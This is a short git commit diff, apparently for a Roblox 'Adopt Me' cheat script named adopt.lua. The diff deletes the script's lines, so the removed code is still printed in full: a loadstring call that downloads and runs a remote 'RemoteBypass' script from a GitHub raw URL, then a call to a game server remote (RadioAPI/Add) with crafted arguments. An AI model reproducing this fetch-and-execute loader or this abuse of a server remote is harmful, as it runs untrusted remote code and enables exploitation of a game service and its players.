2e33a3f3889554847e81dcb3b58e2ac118047163
greg66n <darien95sm@hotmail.com>
2025-03-01 06:18:26 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,9 +1,1 @@
-wait(90)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
-wait(5)
-local args = {
-    [1] = "\128",
-    [2] = 123
-}
 
-game:GetService("ReplicatedStorage").API:FindFirstChild("RadioAPI/Add"):InvokeServer(unpack(args))
